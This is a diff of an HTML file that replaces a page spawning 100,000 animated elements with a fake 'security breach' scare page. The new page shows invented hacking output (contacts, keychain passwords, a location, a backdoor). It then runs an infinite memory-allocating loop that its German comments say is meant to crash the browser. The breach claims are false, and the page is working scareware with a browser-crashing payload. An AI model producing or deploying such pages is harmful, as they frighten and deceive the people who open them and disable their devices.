@@ -1,23 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-<style>
-  @keyframes spin {
-    from { transform: rotate(0deg) scale(1) translateX(0); }
-    to { transform: rotate(360deg) scale(100) translateX(100px); }
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Alert</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #000;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      overflow: hidden;
+    }
+    #overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.95);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    #warning {
+      color: #ff0000;
+      font-size: 28px;
+      font-weight: bold;
+      text-align: center;
+      animation: blink 0.3s infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    #terminal {
+      width: 90%;
+      max-width: 600px;
+      height: 300px;
+      overflow: hidden;
+      border: 1px solid #00ff00;
+      padding: 10px;
+      font-size: 12px;
+      line-height: 1.4;
+    }
+    #progress {
+      width: 90%;
+      max-width: 600px;
+      margin-top: 20px;
+      height: 20px;
+      border: 1px solid #ff0000;
+    }
+    #progressbar {
+      height: 100%;
+      width: 0%;
+      background: #ff0000;
+      transition: width 0.1s;
+    }
+    #status {
+      color: #ff0000;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
-<script>
-  for(let i = 0; i < 100000; i++) {
-    const d = document.createElement('div');
-    d.style.animation = 'spin 0.001s infinite';
-    d.style.width = '100px';
-    d.style.height = '100px';
-    d.style.background = 'red';
-    document.body.appendChild(d);
-  }
-</script>
+  <div id="overlay">
+    <div id="warning">⚠ SECURITY BREACH DETECTED ⚠</div>
+    <div id="terminal"></div>
+    <div id="progress"><div id="progressbar"></div></div>
+    <div id="status">ACCESSING DEVICE DATA...</div>
+  </div>
+
+  <script>
+    const terminal = document.getElementById('terminal');
+    const progressbar = document.getElementById('progressbar');
+    const status = document.getElementById('status');
+
+    const lines = [
+      '> Initializing breach protocol...',
+      '> Scanning network interfaces...',
+      '> Found device: iPad (MDM managed)',
+      '> Bypassing MDM restrictions...',
+      '> Extracting contacts database...',
+      '> Contacts found: 247',
+      '> Accessing iCloud keychain...',
+      '> Passwords extracted: 89',
+      '> Locating device GPS...',
+      '> Location: Strausberg, Brandenburg',
+      '> Uploading data to remote server...',
+      '> Disabling security features...',
+      '> Installing backdoor...',
+      '> Access granted.',
+    ];
+
+    let lineIndex = 0;
+    let progress = 0;
+
+    const typeLines = setInterval(() => {
+      if (lineIndex < lines.length) {
+        const p = document.createElement('p');
+        p.textContent = lines[lineIndex];
+        terminal.appendChild(p);
+        terminal.scrollTop = terminal.scrollHeight;
+        lineIndex++;
+        progress = (lineIndex / lines.length) * 70;
+        progressbar.style.width = progress + '%';
+      }
+    }, 400);
+
+    // nach 6 Sekunden: RAM-Killer startet, Browser crasht
+    setTimeout(() => {
+      status.textContent = 'EXECUTING PAYLOAD — SYSTEM COMPROMISED';
+      progressbar.style.background = '#ff6600';
+
+      let p = 70;
+      const fillProgress = setInterval(() => {
+        p += 2;
+        progressbar.style.width = p + '%';
+        if (p >= 100) {
+          clearInterval(fillProgress);
+          status.textContent = 'COMPLETE — DEVICE COMPROMISED';
+
+          // RAM-Killer → Browser crasht
+          setTimeout(() => {
+            const arr = [];
+            while(true) {
+              arr.push(new Array(1000000).fill('☠'));
+            }
+          }, 500);
+        }
+      }, 100);
+    }, 6000);
+  </script>
 </body>
 </html>
